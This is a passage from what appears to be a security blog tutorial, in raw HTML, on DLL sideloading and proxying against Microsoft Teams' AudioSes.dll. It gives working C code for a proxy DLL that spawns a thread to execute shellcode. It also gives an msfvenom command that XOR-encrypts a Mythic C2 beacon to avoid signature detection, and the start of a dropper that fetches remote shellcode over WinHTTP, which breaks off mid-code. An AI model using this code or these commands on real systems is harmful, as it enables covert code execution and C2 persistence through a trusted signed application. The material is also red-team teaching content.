#dadada;"> </span><span style="color: #569cd6;">sizeof</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">buf</span><span style="color: #b4b4b4;">));</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">((</span><span style="color: #569cd6;">int</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">*</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">)())</span><span style="color: #dadada;"> mem_map</span><span style="color: #b4b4b4;">)();</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">return</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">;</span><br><span style="color: #b4b4b4;">}</span><br><br><span style="color: #dadada;">BOOL APIENTRY </span><span style="color: #dcdcaa;">DllMain</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">HMODULE hModule</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> DWORD ul_reason_for_call</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> LPVOID lpReserved</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><span style="color: #dadada;"> HANDLE hThread </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">;</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">switch</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">ul_reason_for_call</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_PROCESS_ATTACH</span><span style="color: #b4b4b4;">:</span><br><span style="color: #dadada;"> hThread </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">CreateThread</span><span style="color: #b4b4b4;">(</span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">LPTHREAD_START_ROUTINE</span><span style="color: #b4b4b4;">)</span><span style="color: #dadada;"> run</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">NULL</span><span style="color: #b4b4b4;">);</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_THREAD_ATTACH</span><span style="color: #b4b4b4;">:</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_THREAD_DETACH</span><span style="color: #b4b4b4;">:</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_PROCESS_DETACH</span><span style="color: #b4b4b4;">:</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">break</span><span style="color: #b4b4b4;">;</span><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">}</span><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">return</span><span style="color: #dadada;"> TRUE</span><span style="color: #b4b4b4;">;</span><br><span style="color: #b4b4b4;">}</span></div>
</div>
<p>After the DLL file is compiled and placed on the writable path, we can now execute the DVTA application once again.</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20382">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-10-DVTA-20240523164742.webp" width="936" height="546" alt="">
</button>
</div>
<figcaption class="caption">Figure 2: DVTA running normally with the new cryptbase.dll</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>After checking the attacker machine, we can confirm that the payload was successfully executed, while the application is operating in absolutely normal manners.</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20384">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-11-payload-20240523165216.webp" width="648" height="181" alt="Screenshot Payload is executed successfully">
</button>
</div>
<figcaption class="caption">Figure 11: Payload is executed successfully</figcaption>
</figure>

</div>
</div>
</div>
</div>
<div class="mod_article color-Schwarz Kein Abstand - 0px bg- block" id="sprung8">
<div class="container container__article">
<div class="row">
<div class="ce_text Mittel - 60px bg-  block" id="lab">
<h2>8. Weaponizing DLL Proxying</h2>
<div class="ce_text__content">
<p>So far, we have touched on the basics of these techniques and DLLs in general. However, when things are translated into practice, they might differ. One common example of that is the executed payload. If you are doing malware development, you will know the sick feeling when your code works with simple payloads like the one showcased above but fails to execute with payloads from complex C2 frameworks like Havoc or Mythic.</p>
<p>Now, instead of showcasing the attack just for the demo purpose, let’s go over one more scenario:</p>
<p><span style="text-decoration: underline;">Seek and destroy</span>:</p>
<p>In this scenario, we will find and weaponize DLL-Sideloading for a signed pre-installed application, and also provide pre-compiled well known windows binary if the first approach fails.</p>
<p>While the DLL hijacking and DLL proxying techniques were working well in the previous examples, the chances you are going to see the DVTA application in a real environment are extremely low. Also, it’s not signed and therefore doesn’t provide any higher trust for EDRs. So, we are going to step back and target a different application. To me, it makes most sense to target applications that are often present in Windows systems. One of such application is Teams.</p>
<p>Before relying directly on Spartacus, let’s try to manually analyze the application for DLL hijacking vulnerabilities by modifying the filters for Process Monitor:</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20386">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-12-procmon-20240729111744.webp" width="949" height="564" alt="Screenshot ProcMon filters for detecting DLL Hijacking vulnerability for teams application">
</button>
</div>
<figcaption class="caption">Figure 12: ProcMon filters for detecting DLL Hijacking vulnerability for teams application</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>After applying them, we can observe that there are a lot of <code>CreateFile </code>operations that result in <code>NAME NOT FOUND</code> from a path in the user’s AppData folder.</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20393">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-13-teams-dll-20240729111807.webp" width="949" height="196" alt="Screenshot of Teams trying to load non-present DLLs from the local user’s AppData folder">
</button>
</div>
<figcaption class="caption">Figure 13: Teams trying to load non-present DLLs from the local user’s AppData folder</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>While at first this might look exciting, not all of the DLLs are suitable for hijacking. By using the same automated process as above, Spartacus was able to generate many different solutions.</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20388">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-14-solution-spartacus-20240729111819.webp" width="949" height="707" alt="Screenshot of generated solutions from spartacus">
</button>
</div>
<figcaption class="caption">Figure 14: Generated solutions from spartacus</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>This might look satisfying at first, but there are some problems with these solutions; not all were suitable for a proper attack. Some of them did not even execute when teams loaded (like <code>wtsapi32.dll</code>). Some of them completely prevented <code>msteams.exe</code> from loading (like <code>DWrite.dll</code>).</p>            </div>
</div><div class="ce_image Gering - 30px bg-  block">
<figure class="image_container">
<div style="position:relative;overflow:hidden;">
<button type="button" class="btn btn-link image-lightbox__show" data-toggle="modal" data-target="#image-modal-20396">
<img src="https://www.r-tec.net/files/content/img/News%2BEvents/Blog_DLL-Sideloading/Bild-15-Teams-failed-20240729111839.webp" width="617" height="232" alt="Screenshot of Teams Failing to start after hijacking DWrite.dll">
</button>
</div>
<figcaption class="caption">Figure 15: Teams failed to start after hijacking DWrite.dll</figcaption>
</figure>

</div><div class="ce_text Mittel - 60px bg-  block" id="tools">
<div class="ce_text__content">
<p>But some of them (like <code>AudioSes.dll</code>) were extremely good and suitable candidates. <code>AudioSes.dll</code> did load only once on startup, which ensures that your beacon will not get executed multiple times (as this was the case with <code>CompPkgSup.dll</code>).</p>
<p>Since we now have a well known, often used and signed target application and a target DLL that does not break the process, it is time to weaponize it for C2 payload execution.</p>
<p>Before diving into the dropper itself, let's first build up the DLL template file. Spartacus came up with the following template for <code>AudioSes.dll</code>:</p>
<div style="color: #dadada; background-color: #1e1e1e; font-family: Droid Sans Mono for Powerline, Menlo, Monaco, 'Courier New', monospace, Menlo, Monaco, 'Courier New', monospace; font-weight: normal; font-size: 12px; line-height: 18px; white-space: pre; max-width: 800px; padding-left: 8px; text-wrap: wrap;">
<div><span style="color: #dadada;">c</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">once</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:DllCanUnloadNow=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">AudioSes.DllCanUnloadNow,@5</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:DllGetActivationFactory=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">AudioSes.DllGetActivationFactory,@6</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:DllGetClassObject=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">AudioSes.DllGetClassObject,@7</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:DllRegisterServer=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">AudioSes.DllRegisterServer,@8</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:DllUnregisterServer=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">AudioSes.DllUnregisterServer,@9</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">windows.h</span><span style="color: #e8c9bb;">"</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">ios</span><span style="color: #e8c9bb;">"</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">fstream</span><span style="color: #e8c9bb;">"</span><br><br><span style="color: #57a64a;">// Remove this line if you aren't proxying any functions.</span><br><br><span style="color: #dadada;">HMODULE hModule </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">LoadLibrary</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">L </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">AudioSes.dll</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #57a64a;">// Remove this function if you aren't proxying any functions.</span><br><br><span style="color: #4ec9b0;">VOID</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">DebugToFile</span><span style="color: #b4b4b4;">(</span><span style="color: #4ec9b0;">LPCSTR</span><span style="color: #dadada;"> </span><span style="color: #9a9a9a;">szInput</span><span style="color: #b4b4b4;">)</span><br><br><span style="color: #b4b4b4;">{</span><br><br><span style="color: #dadada;"> </span><span style="color: #c8c8c8;">std</span><span style="color: #b4b4b4;">::</span><span style="color: #dadada;">ofstream </span><span style="color: #dcdcaa;">log</span><span style="color: #b4b4b4;">(</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">spartacus-proxy-AudioSes.log</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #c8c8c8;">std</span><span style="color: #b4b4b4;">::</span><span style="color: #c8c8c8;">ios_base</span><span style="color: #b4b4b4;">::</span><span style="color: #dadada;">app </span><span style="color: #b4b4b4;">|</span><span style="color: #dadada;"> </span><span style="color: #c8c8c8;">std</span><span style="color: #b4b4b4;">::</span><span style="color: #c8c8c8;">ios_base</span><span style="color: #b4b4b4;">::</span><span style="color: #dadada;">out</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #dadada;"> log </span><span style="color: #b4b4b4;">&lt;&lt;</span><span style="color: #dadada;"> szInput</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> log </span><span style="color: #b4b4b4;">&lt;&lt;</span><span style="color: #dadada;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ffd68f;">\n</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #b4b4b4;">}</span><br><br><span style="color: #dadada;">BOOL APIENTRY </span><span style="color: #dcdcaa;">DllMain</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">HMODULE hModule</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> DWORD ul_reason_for_call</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> LPVOID lpReserved</span><span style="color: #b4b4b4;">)</span><br><br><span style="color: #b4b4b4;">{</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">switch</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">ul_reason_for_call</span><span style="color: #b4b4b4;">)</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">{</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_PROCESS_ATTACH</span><span style="color: #b4b4b4;">:</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_THREAD_ATTACH</span><span style="color: #b4b4b4;">:</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_THREAD_DETACH</span><span style="color: #b4b4b4;">:</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">case</span><span style="color: #dadada;"> DLL_PROCESS_DETACH</span><span style="color: #b4b4b4;">:</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">break</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">}</span><br><br><span style="color: #dadada;"> </span><span style="color: #d8a0df;">return</span><span style="color: #dadada;"> TRUE</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #b4b4b4;">}</span></div>
</div>
<p>Now it’s time to modify it to not only give us a reverse shell but also a beacon from a chosen C2 framework. Since I am a huge Mythic fan, I will use it throughout this blog post.</p>
<p><em>I will not dive into <a title="Video-Link to Youtube - how to install and setup the Mythic C2 framework" href="https://www.youtube.com/watch?v=QmC1zhpTxww" target="_blank" rel="noopener">"how to install and setup the Mythic C2 framework"</a> since I already made a video about it.</em></p>
<p>If you prefer any other C2 framework, make sure to generate your beacon in shellcode format (.bin) and move on to the next points.</p>
<p>The next step is to encrypt the payload, as we do not want it to be flagged by a signature. To XOR encrypt the payload from Mythic, I will use msfvenom:</p>
<p><code>msfvenom -p generic/custom payloadfile=apollo.bin --encrypt xor --encrypt-key e001ffbe97fc842aeb4a91161f6291f1 -f raw -o enc.bin</code></p>
<p><em>Note: In the previous command, the encryption key was a basic MD5 hash; avoid the use of single-character keys and definitely note down the key you used. It will be needed later on.</em></p>
<p>Now the payload is encrypted and ready in a file called enc.bin. The next step is to modify our Sideload DLL to fetch and execute it during runtime. The code for downloading remote shellcode into the memory and then executing it with C/C++ is already present on my Offensive C/C++ repository and can be found <a title="Link to Github" href="https://github.com/lsecqt/OffensiveCpp/blob/main/Techniques/HTTP_Staging.cpp" target="_blank" rel="noopener">on Github.</a></p>
<p>After integrating it, the Sideloading DLL code looks like this:</p>
<div style="color: #dadada; background-color: #1e1e1e; font-family: Droid Sans Mono for Powerline, Menlo, Monaco, 'Courier New', monospace, Menlo, Monaco, 'Courier New', monospace; font-weight: normal; font-size: 12px; line-height: 18px; white-space: pre; max-width: 800px; padding-left: 8px; text-wrap: wrap;">
<div><span style="color: #dadada;">c</span><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">once</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:DllCanUnloadNow=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">AudioSes.DllCanUnloadNow,@5</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:DllGetActivationFactory=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">AudioSes.DllGetActivationFactory,@6</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:DllGetClassObject=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">AudioSes.DllGetClassObject,@7</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:DllRegisterServer=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">AudioSes.DllRegisterServer,@8</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">linker</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">/export:DllUnregisterServer=C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">AudioSes.DllUnregisterServer,@9</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">windows.h</span><span style="color: #e8c9bb;">"</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">ios</span><span style="color: #e8c9bb;">"</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">fstream</span><span style="color: #e8c9bb;">"</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">&lt;</span><span style="color: #ce9178;">stdio.h</span><span style="color: #e8c9bb;">&gt;</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">&lt;</span><span style="color: #ce9178;">tlhelp32.h</span><span style="color: #e8c9bb;">&gt;</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">&lt;</span><span style="color: #ce9178;">winhttp.h</span><span style="color: #e8c9bb;">&gt;</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">include</span><span style="color: #c8c8c8;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">Winternl.h</span><span style="color: #e8c9bb;">"</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">lib</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">winhttp.lib</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><br><span style="color: #b4b4b4;">#</span><span style="color: #9a9a9a;">pragma</span><span style="color: #c8c8c8;"> </span><span style="color: #9a9a9a;">comment</span><span style="color: #c8c8c8;">(</span><span style="color: #9a9a9a;">lib</span><span style="color: #c8c8c8;">, </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">ntdll</span><span style="color: #e8c9bb;">"</span><span style="color: #c8c8c8;">)</span><br><br><span style="color: #57a64a;">// Remove this line if you aren't proxying any functions.</span><br><br><span style="color: #dadada;">HMODULE hModule </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">LoadLibrary</span><span style="color: #b4b4b4;">(</span><span style="color: #dadada;">L </span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">C:</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">Windows</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">System32</span><span style="color: #ffd68f;">\\</span><span style="color: #ce9178;">AudioSes.dll</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #57a64a;">// Remove this function if you aren't proxying any functions.</span><br><br><span style="color: #4ec9b0;">VOID</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">DebugToFile</span><span style="color: #b4b4b4;">(</span><span style="color: #4ec9b0;">LPCSTR</span><span style="color: #dadada;"> </span><span style="color: #9a9a9a;">szInput</span><span style="color: #b4b4b4;">)</span><br><br><span style="color: #b4b4b4;">{</span><br><br><span style="color: #dadada;"> </span><span style="color: #c8c8c8;">std</span><span style="color: #b4b4b4;">::</span><span style="color: #dadada;">ofstream </span><span style="color: #dcdcaa;">log</span><span style="color: #b4b4b4;">(</span><span style="color: #e8c9bb;">"</span><span style="color: #ce9178;">spartacus-proxy-AudioSes.log</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #c8c8c8;">std</span><span style="color: #b4b4b4;">::</span><span style="color: #c8c8c8;">ios_base</span><span style="color: #b4b4b4;">::</span><span style="color: #dadada;">app </span><span style="color: #b4b4b4;">|</span><span style="color: #dadada;"> </span><span style="color: #c8c8c8;">std</span><span style="color: #b4b4b4;">::</span><span style="color: #c8c8c8;">ios_base</span><span style="color: #b4b4b4;">::</span><span style="color: #dadada;">out</span><span style="color: #b4b4b4;">);</span><br><br><span style="color: #dadada;"> log </span><span style="color: #b4b4b4;">&lt;&lt;</span><span style="color: #dadada;"> szInput</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> log </span><span style="color: #b4b4b4;">&lt;&lt;</span><span style="color: #dadada;"> </span><span style="color: #e8c9bb;">"</span><span style="color: #ffd68f;">\n</span><span style="color: #e8c9bb;">"</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #b4b4b4;">}</span><br><br><span style="color: #569cd6;">unsigned</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">char</span><span style="color: #dadada;"> </span><span style="color: #9cdcfe;">buf</span><span style="color: #b4b4b4;">[</span><span style="color: #b5cea8;">1365758</span><span style="color: #b4b4b4;">];</span><br><br><span style="color: #569cd6;">void</span><span style="color: #dadada;"> </span><span style="color: #dcdcaa;">dl</span><span style="color: #b4b4b4;">(</span><span style="color: #569cd6;">const</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">wchar_t</span><span style="color: #dadada;"> </span><span style="color: #b4b4b4;">*</span><span style="color: #dadada;"> </span><span style="color: #9a9a9a;">host</span><span style="color: #b4b4b4;">,</span><span style="color: #dadada;"> </span><span style="color: #569cd6;">short</span><span style="color: #dadada;"> </span><span style="color: #9a9a9a;">port</span><span style="color: #b4b4b4;">)</span><br><br><span style="color: #b4b4b4;">{</span><br><br><span style="color: #dadada;"> </span><span style="color: #569cd6;">int</span><span style="color: #dadada;"> counter </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> DWORD dwSize </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> DWORD dwDownloaded </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> </span><span style="color: #b5cea8;">0</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> LPSTR pszOutBuffer</span><span style="color: #b4b4b4;">;</span><br><br><span style="color: #dadada;"> BOOL bResults </span><span style="color: #b4b4b4;">=</span><span style="color: #dadada;"> FALSE</span><span style="color: 